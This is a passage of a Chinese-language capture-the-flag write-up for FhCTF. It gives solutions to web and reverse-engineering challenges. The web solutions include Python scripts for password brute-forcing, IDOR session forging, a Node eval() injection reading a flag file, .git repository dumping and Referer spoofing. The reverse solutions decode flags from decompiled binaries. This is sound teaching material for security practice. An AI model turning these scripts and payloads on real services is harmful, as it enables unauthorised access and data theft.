               print(f"[{req.status_code}] Found: {password.strip()}")
               print(req.text)
               with password_queue.mutex:
                   password_queue.queue.clear()
               break
   
           progress.update(1)
           password_queue.task_done()
   
   
   threads = []
   for _ in range(10):
       thread = threading.Thread(target=try_password)
       thread.start()
       threads.append(thread)
   
   for thread in threads:
       thread.join()
   ```

5. 登入後就可以直接拿Flag
   ![image](https://hackmd.io/_uploads/SJlHflOBR.png)

> Flag: `FhCTF{W34k_p455w0rd_m4y_c4u53_d4ng3r}`

---

### Baking Store

> {{< spoiler "原圖" >}}
> ![Challenge](https://hackmd.io/_uploads/B1NAZK4B0.png "500px")
> {{< /spoiler >}}
> 烘焙時間！  
> 烤東西，烤東西！  
> 但是好像會烤到不該烤的？  
> https://baking.fhh4ck3rs.taipei/
>
> Author: CXPh03n1x

#### 題解

1. 有Flag可以烤欸!
   ![image](https://hackmd.io/_uploads/BJ2UXl_r0.png)

2. 發現Cookie很可疑，先Base64 Decode，再 Hex to Ascii做解析

   ```json
   {
     "id": "flag",
     "name": "旗",
     "time": 31536000000,
     "start_time": 1717836217947
   }
   ```

3. 將`time`改為0再重新置回
   ![image](https://hackmd.io/_uploads/HJHDme_rA.png)

> Flag: `FhCTF{Cl13nt_s1d3_auth0r1z3d_1s_d4ng3r!!!!}`

---

### Baking Store Revenge

> {{< spoiler "原圖" >}}
> ![Challenge](https://hackmd.io/_uploads/S1Ty4euHC.png "500px")
> {{< /spoiler >}}
> 復仇，復仇，最後的復仇  
> 可以見得，已經出題目出到瘋了...  
> https://baking-revenge.fhh4ck3rs.taipei/
>
> Author: CXPh03n1x

#### 題解

1. 比起上一題多了個登入按鈕，可以使用任意名稱登入
2. 驗證身份的方式有Cookie中的Session與網址後的id，嘗試爆破尋找有烤過東西的帳號
3. 寫腳本，約在20秒後可發現admin帳號與Flag
   ```python
   for i in tqdm.tqdm(range(65577, 0, -1)):
       session = base64.b64encode(f'{{"id": {i}, "baking": []}}'.encode()).decode()
   
       req = requests.get(f'https://baking-revenge.fhh4ck3rs.taipei/users/{i}',
                          cookies={'session': session}
                          )
   
       if '還沒有烤過任何東西' not in req.text:
           print(req.text)
           break
   ```

   ![image](https://hackmd.io/_uploads/Bkozrx_rC.png)

> Flag: `FhCTF{IDOR_1s_t3rr4bl3_w1th_n0_l1m173d...}`

---

### A Web

> {{< spoiler "原圖" >}}
> ![Challenge](https://hackmd.io/_uploads/B1TXqv4BR.png "500px")
> {{< /spoiler >}}
> Just a WEB, nothing else..  
> 我認真的說..就是一個web，沒有其他的了.  
> https://aweb.fhh4ck3rs.taipei/
>
> Author: xiunG

#### 題解

1. Flag 1/3 ![image](https://hackmd.io/_uploads/HJuSqvVH0.png)

2. Flag 2/3
   ![image](https://hackmd.io/_uploads/HJ7N9vErC.png)
   ![image](https://hackmd.io/_uploads/rya95PVBC.png)

3. Flag 3/3 ![image](https://hackmd.io/_uploads/BkKD5D4SC.png)

---

### Gotcha

> {{< spoiler "原圖" >}}
> ![Challenge](https://hackmd.io/_uploads/H1lTSKVH0.png "500px")
> {{< /spoiler >}}
> Can you get the flag?    
> https://gotcha.fhh4ck3rs.taipei/
>
> Author: Scott

#### 題解

點開題目DotGit插件馬上跳通知，因此從這方面下手，用githacker拿到在index.php的flag

**payload:**

   ```bash
   $ githacker --url https://gotcha.fhh4ck3rs.taipei/.git --output-folder tmp
   ```

> Flag: `FhCTF{I_9iT_!7}`

---

### BMI 計算機

> {{< spoiler "原圖" >}}
> ![Challenge](https://hackmd.io/_uploads/SkRoHgOrR.png "500px")
> {{< /spoiler >}}
> 體重的控制是重要的  
> ......但是說真的，減肥真的好難QWQ  
> 所以...別講這種傷感情的事情了好嗎！  
> https://bmi-calc.fhh4ck3rs.taipei/
>
> Author: xiunG

#### 題解

1. 附加檔案中的`app.js`，其中`result = eval(expression);`可作為攻擊點
2. 寫腳本
   ```python
   import requests
   
   req = requests.post('https://bmi-calc.fhh4ck3rs.taipei/bmi', json={
       'string': "require(\'fs\').readFileSync(\'./flag\').toString()"
   })
   print(req.status_code)
   print(req.content)
   ```

> Flag: `FhCTF{bReAk_bM1_cAcu1aT0r}`

---

### Login

> {{< spoiler "原圖" >}}
> ![Challenge](https://hackmd.io/_uploads/SyvvUxdHA.png "500px")
> {{< /spoiler >}}
> I found a login page. What is the account and password?  
> https://login.fhh4ck3rs.taipei
>
> Author: Scott

#### 題解

1. DotGit發威
2. 先撈資料 `$ githacker --url https://login.fhh4ck3rs.taipei/.git/ --output-folder result`
3. 因為不熟Git，所以用常用的IDE去分析.git/拿到帳號密碼
   ![image](https://hackmd.io/_uploads/rJ87we_BC.png)
4. 登入後就可以拿到Flag

> Flag: `FhCTF{r3m0ve_fr0m_F1LE_6U7_in_Rep0}`

---

### 上鎖了！？

> {{< spoiler "原圖" >}}
> ![Challenge](https://hackmd.io/_uploads/B1r6wldrA.png "500px")
> {{< /spoiler >}}
> 公堂之上，假設一下不犯法吧？  
> 但是上鎖是真的啦！！  
> https://locked.fhh4ck3rs.taipei/
>
> Author: CXPh03n1x

#### 題解

1. 網站中的「鎖在外面了」給了兩個解題方向「XFF」與「Referer」
2. 看完在`robots.txt`更加印證了這點
3. 再用`dirb`後得到/admin可被訪問
   ![image](https://hackmd.io/_uploads/ryOm_gdHC.png)
4. 這裡好像本來是要藏起來，但被Darkreader助攻了，得知Flag的路徑
   ![image](https://hackmd.io/_uploads/HJH75l_rC.png)
5. 在main.js中也發現了可疑的段落，可直接將thing讀出，或訪問`/admin/#secret`路徑
   ```javascript
   var thing = atob(atob(atob("VERKR2EySlhiSFZNTUVaTVUydFNWRk5yV2t4U1JrNUxWRVZHVkZKcE9YSmpNbmhyWVcxYWRtRlhSbXRqTWxsMVpFaG9NQT09")));
   
   fetch(thing).then(function (response) {
       return response.text();
   }).then(function (data) {
       pages["secret"] = data;
   
       if (!location.hash) {
           location.hash = "#home";
       }
       loadContent();
   
       window.addEventListener("hashchange", loadContent)
   });
   ```

6. 根據「你必須從 locked.fhh4ck3rs.taipei 來才能看到 flag!
   但是記得...因為上鎖，其實也就不用這麼安全的訪問了！」，猜要把`https`變更為`http`
7. 寫腳本
   ```py
   import requests
   
   req = requests.get('https://locked.fhh4ck3rs.taipei/admin/flag.txt', headers={
       'Referer': 'http://locked.fhh4ck3rs.taipei'
   })
   
   print(req.status_code)
   print(req.content.decode('utf-8'))
   ```

> Flag: `FhCTF{4n_unl0cked_l0ck_15_s7up1d}`


---

## REVERSE

### BabyReverse

> {{< spoiler "原圖" >}}
> ![Challenge](https://hackmd.io/_uploads/SJ0o2g_rC.png "500px")
> {{< /spoiler >}}
> 真．嬰兒等級逆向  
> 雖然解題是嬰兒，但是出題卻是博士..人生好難QWQ。
>
> Author: CXPh03n1x

#### 題解

進gdb用 `$ jump print_flag`
![image](https://hackmd.io/_uploads/SyldxTy_r0.png)

> Flag: `FhCTF{Y0u_ar3_b4by_r3v3r53_eng1n33r$%&}`

---

### BabyReverse Revenge

> {{< spoiler "原圖" >}}
> ![Challenge](https://hackmd.io/_uploads/SJ0o2g_rC.png "500px")
> {{< /spoiler >}}
> 報仇？說「搞自己」還比較  
> 準確點...
> 說真的...為什麼出題者們都喜歡把變難的題目說成是「復仇」？
>
> Author: CXPh03n1x

#### 題解

這題不再是 jump 就有答案

![image](https://hackmd.io/_uploads/BytUVx_HA.png)

{{< spoiler "逆向結果" >}}

```c {linenos=inline}
void print_flag(void)

{
  undefined *answer;
  long in_FS_OFFSET;
  undefined auStack_178 [8];
  int j;
  undefined4 var_0x7f;
  ulong var_0x23;
  undefined8 local_160;
  undefined8 local_158;
  undefined *local_150;
  int buffer [74];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  buffer[0] = 0x79;
  buffer[1] = 0x57;
  buffer[2] = 0x7c;
  buffer[3] = 0x6b;
  buffer[4] = 0x79;
  buffer[5] = 0x44;
  buffer[6] = 0x68;
  buffer[7] = 0x57;
  buffer[8] = 0x46;
  buffer[9] = 0x60;
  buffer[10] = 0x7c;
  buffer[11] = 8;
  buffer[12] = 0x79;
  buffer[13] = 0xc;
  buffer[14] = 0x4d;
  buffer[15] = 0x4c;
  buffer[16] = 0x60;
  buffer[17] = 0x53;
  buffer[18] = 0xe;
  buffer[19] = 0x54;
  buffer[20] = 0xc;
  buffer[21] = 0x60;
  buffer[22] = 0x4d;
  buffer[23] = 0xc;
  buffer[24] = 0x49;
  buffer[25] = 0xc;
  buffer[26] = 0x51;
  buffer[27] = 0x58;
  buffer[28] = 0xc;
  buffer[29] = 0x11;
  buffer[30] = 0x11;
  buffer[31] = 0x1b;
  buffer[32] = 0;
  buffer[33] = 0x1b;
  buffer[34] = 0x42;
  buffer[36] = 0x6f;
  buffer[37] = 0x6f;
  buffer[38] = 0x6f;
  buffer[39] = 0x70;
  buffer[40] = 0x73;
  buffer[41] = 0x2e;
  buffer[42] = 0x2e;
  buffer[43] = 0x49;
  buffer[44] = 0x20;
  buffer[45] = 0x66;
  buffer[46] = 0x6f;
  buffer[47] = 0x72;
  buffer[48] = 0x67;
  buffer[49] = 0x6f;
  buffer[50] = 0x74;
  buffer[51] = 0x20;
  buffer[52] = 0x74;
  buffer[53] = 0x6f;
  buffer[54] = 0x20;
  buffer[55] = 0x61;
  buffer[56] = 100;
  buffer[57] = 100;
  buffer[58] = 0x20;
  buffer[59] = 0x6d;
  buffer[60] = 0x61;
  buffer[61] = 0x73;
  buffer[62] = 0x6b;
  buffer[63] = 0x20;
  buffer[64] = 0x27;
  buffer[65] = 0x3f;
  buffer[66] = 0x27;
  buffer[67] = 0x20;
  buffer[68] = 0x2e;
  buffer[69] = 0x2e;
  buffer[70] = 0x2e;
  buffer[71] = 0x4f;
  buffer[72] = 0x72;
  buffer[73] = 0x7a;
  var_0x23 = 0x23;
  local_160 = 0x26;
  var_0x7f = 0x7f;
  local_158 = 0x23;
  for (answer = auStack_178; answer != auStack_178; answer = answer + -0x1000) {
    *(undefined8 *)(answer + -8) = *(undefined8 *)(answer + -8);
  }
  *(undefined8 *)(answer + -8) = *(undefined8 *)(answer + -8);
  local_150 = answer + -0x30;
  for (j = 0; (ulong)(long)j < var_0x23; j = j + 1) {
    answer[(long)j + -0x30] = (byte)buffer[j] ^ (byte)var_0x7f;
  }
  answer[var_0x23 - 0x2f] = 0;
  *(undefined8 *)(answer + -0x38) = 0x10177a;
  puts(answer + -0x30);
  if (canary == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

{{< /spoiler >}}

可以看到做運算的地方迴圈只有跑 `0x23` 次，但 buffer 的大小遠超於這個數字
若把之後的資料給 print 出來

{{< spoiler "分析 + 答案" >}}

```python {linenos=inline}
buffer = [
0x00000079,	0x00000057,	0x0000007c,	0x0000006b,
0x00000079,	0x00000044,	0x00000068,	0x00000057,
0x00000046,	0x00000060,	0x0000007c,	0x00000008,
0x00000079,	0x0000000c,	0x0000004d,	0x0000004c,
0x00000060,	0x00000053,	0x0000000e,	0x00000054,
0x0000000c,	0x00000060,	0x0000004d,	0x0000000c,
0x00000049,	0x0000000c,	0x00000051,	0x00000058,
0x0000000c,	0x00000011,	0x00000011,	0x0000001b,
0x00000000,	0x0000001b,	0x00000042,	0x00000000,
0x0000006f,	0x0000006f,	0x0000006f,	0x00000070,
0x00000073,	0x0000002e,	0x0000002e,	0x00000049,
0x00000020,	0x00000066,	0x0000006f,	0x00000072,
0x00000067,	0x0000006f,	0x00000074,	0x00000020,
0x00000074,	0x0000006f,	0x00000020,	0x00000061,
0x00000064,	0x00000064,	0x00000020,	0x0000006d,
0x00000061,	0x00000073,	0x0000006b,	0x00000020,
0x00000027,	0x0000003f,	0x00000027,	0x00000020,
0x0000002e,	0x0000002e,	0x0000002e,	0x0000004f,
0x00000072,	0x0000007a]


for char in buffer[:0x23]: print(chr(char ^ 0x7f), end='')
print('\n============================================')
for char in buffer[0x23:]: print(chr(char), end='')
print()

# (;(9ws23,q+s2s6s.'snndd= 錯誤的 flag
# ============================================
# ooops..I forgot to add mask '?' ...Orz 看起來是跟 '?' 做運算有關

# 答案:
for char in buffer[:0x23]: print(chr(char ^ ord('?')), end='')
```

{{< /spoiler >}}

> Flag: `FhCTF{Why_C7F3rs_l1k3_r3v3ng3..$?$}`

---

### 真。逆向工程

> {{< spoiler "原圖" >}}
> ![Challenge](https://hackmd.io/_uploads/S1JUgb_BA.png "500px")
> {{< /spoiler >}}
> 真的來了，逆向工程真的來了！！    
> 總之..這次真的來了！
>
> Author: CXPh03n1x

#### 題解

{{< spoiler "逆向結果 main" >}}

```c {linenos=inline}
/* WARNING: Removing unreachable block (ram,0x00101690) */

undefined8 main(int argc,char **argv) {
  int random_num;
  time_t tVar1;
  long lVar2;
  char **ppcVar3;
  char **ppcVar4;
  long in_FS_OFFSET;
  byte bVar5;
  char *answer_list [41];
  long canary;
  
  bVar5 = 0;
  canary = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdout,(char *)0x0,2,0);
  tVar1 = time((time_t *)0x0);
  srand((uint)tVar1);
  if (argc != 2) {
    puts(&DAT_00102008);
    puts(&DAT_00102024);
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  ppcVar3 = &PTR_s_Outlook_not_so_good._00104020;
  ppcVar4 = answer_list;
  for (lVar2 = 0x28; lVar2 != 0; lVar2 = lVar2 + -1) {
    *ppcVar4 = *ppcVar3;
    ppcVar3 = ppcVar3 + (ulong)bVar5 * -2 + 1;
    ppcVar4 = ppcVar4 + (ulong)bVar5 * -2 + 1;
  }
  puts("You asked:");
  msleep(0,500);
  printf("\"%s\"\n",argv[1]);
  msleep(1,0);
  printf("Hmmm");
  msleep(1,0);
  putchar(0x2e);
  msleep(1,0);
  putchar(0x2e);
  msleep(1,0);
  putchar(0x2e);
  msleep(1,0);
  puts(".");
  msleep(2,0);
  random_num = rand();
  puts(answer_list[(int)((ulong)(long)random_num % 0x28)]);
  if (canary == *(long *)(in_FS_OFFSET + 0x28)) {
    return 0;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

{{< /spoiler >}}

他還有一個 print_flag，在 main 裡面其實有，但是沒有顯示出來(或許是不可能跑到這個分支)

{{< spoiler "逆向結果 print_flag" >}}

```c {linenos=inline}

void print_flag(void)

{
  long in_FS_OFFSET;
  int i;
  int j;
  int k;
  char buffer [57];
  char secret [57];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  secret[0] = '\v';
  secret[1] = '+';
  secret[2] = 'W';
  secret[3] = 'y';
  secret[4] = '\x19';
  secret[5] = '-';
  secret[6] = '\x60';
  secret[7] = '0';
  secret[8] = '\a';
  secret[9] = 'V';
  secret[10] = '@';
  secret[11] = ',';
  secret[12] = '\v';
  secret[13] = '\x1e';
  secret[14] = '\x19';
  secret[15] = 'D';
  secret[16] = 'o';
  secret[17] = 'm';
  secret[18] = '\x0f';
  secret[19] = '\x18';
  secret[20] = '\t';
  secret[21] = 't';
  secret[22] = 'w';
  secret[23] = '\x1b';
  secret[24] = '\x16';
  secret[25] = '$';
  secret[26] = 'g';
  secret[27] = 'R';
  secret[28] = '*';
  secret[29] = '\x02';
  secret[30] = '\x0f';
  secret[31] = '*';
  secret[32] = '}';
  secret[33] = ']';
  secret[34] = 'w';
  secret[35] = 'N';
  secret[36] = 'R';
  secret[37] = '%';
  secret[38] = '\x1b';
  secret[39] = '\x60';
  secret[40] = 'I';
  secret[41] = '\x06';
  secret[42] = 'd';
  secret[43] = '[';
  secret[44] = 'c';
  secret[45] = '%';
  secret[46] = '-';
  secret[47] = ',';
  secret[48] = '\x60';
  secret[49] = '!';
  secret[50] = '\b';
  secret[51] = '@';
  secret[52] = 'f';
  secret[53] = 'K';
  secret[54] = 'z';
  secret[55] = 'R';
  stack0xffffffffffffffb0 = 0x71e2064576e5b5b;
  buffer[0] = '$';
  buffer[1] = '\x0e';
  buffer[2] = 's';
  buffer[3] = '7';
  buffer[4] = '\x01';
  buffer[5] = '>';
  buffer[6] = 'c';
  buffer[7] = 'H';
  buffer[8] = 'S';
  buffer[9] = '_';
  buffer[10] = ')';
  buffer[11] = '>';
  buffer[12] = 'o';
  buffer[13] = 'n';
  buffer[14] = '-';
  buffer[15] = 'r';
  buffer[16] = '\a';
  buffer[17] = '0';
  buffer[18] = 'i';
  buffer[19] = 'A';
  buffer[20] = '\x11';
  buffer[21] = 'y';
  buffer[22] = '8';
  buffer[23] = '\'';
  buffer[24] = 'l';
  buffer[25] = 'X';
  buffer[26] = '\t';
  buffer[27] = 'Z';
  buffer[28] = '-';
  buffer[29] = '0';
  buffer[30] = 'e';
  buffer[31] = 'y';
  buffer[32] = '\x1e';
  buffer[33] = '\x1a';
  buffer[34] = 'i';
  buffer[35] = '}';
  buffer[36] = '\x19';
  buffer[37] = '8';
  buffer[38] = '{';
  buffer[39] = '\x01';
  buffer[40] = 'T';
  buffer[41] = 'U';
  buffer[42] = '<';
  buffer[43] = '=';
  buffer[44] = 'E';
  buffer[45] = 'z';
  buffer[46] = '\t';
  buffer[47] = 'x';
  buffer[48] = '\x1f';
  buffer[49] = '3';
  buffer[50] = 's';
  buffer[51] = '{';
  buffer[52] = 'Q';
  buffer[53] = '-';
  buffer[54] = '\x18';
  buffer[55] = '\0';
  buffer[56] = 'O';
  for (i = 56; 0 < i; i = i + -1) {
    buffer[i] = buffer[i + -1] ^ buffer[i];
  }
  for (j = 0; (uint)j < 57; j = j + 1) {
    buffer[j] = buffer[j] ^ 0x69;
  }
  for (k = 0; (uint)k < 57; k = k + 1) {
    buffer[k] = secret[k] ^ buffer[k];
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

{{< /spoiler >}}

因為沒有 puts 出來，所以直接跑到 print_flag 看記憶體
![image](https://hackmd.io/_uploads/HytcaxuHC.png)

> Flag: `FhCTF{Tru3_R3v3rs3?Y0u_m4y_h4v3_s0m3_m1sund3rs74nd!!%^&#}`

---

### Secret Message

> {{< spoiler "原圖" >}}
> ![Challenge](https://hackmd.io/_uploads/ry_Peb_SA.png "500px")
> {{< /spoiler >}}
> I got an encryption program and an encrypted message. How can I decrypt it
>
> Author: Scott

#### 題解

給了兩個檔案

1. `enc`: 執行
2. `flag.enc`: `751 707 513 755 627 1036 1005 109 682 674 252 671 247 259 439 526 318 574 742 135 709 731 495 872 436 827`

直接執行 `enc` 會得到: `Usage: enc [FILE]`
`flag.enc` 八成是 `enc flag` 的結果

嘗試 `enc` 內容是 'FhCTF{' 的檔案

```bash
$ cat flag
FhCTF{

$ ./enc flag
751 707 513 755 627 1036
```

嘗試 `enc` 內容是 'FhCTF{?' 的檔案

```bash
$ cat flag
FhCTF{?

$ ./enc flag
751 707 513 755 627 1036 986 
```

所以可以快速爆破最後一個字元直到和 `flag.enc` 一樣
這裡用比較笨的方法，用 pwntools 的 process 操作

```python {linenos=inline}
from pwn import *
from string import printable

flag = ""
flag_enc = "751 707 513 755 627 1036 1005 109 682 674 252 671 247 259 439 526 318 574 742 135 709 731 495 872 436 827".split()

for enc in flag_enc:
    for char in printable:
        with open("./flag", "wb") as file:
            tmp = flag + char
            file.write(tmp.encode())
        
        io = process(["./enc", "./flag"])
        if io.recv().decode().split(' ')[-2] == enc:
            flag += char
            break
        io.close()

# 最後 flag 的內容就是答案
```

> Flag: `FhCTF{R@nD0m_S33d_1S_C001}`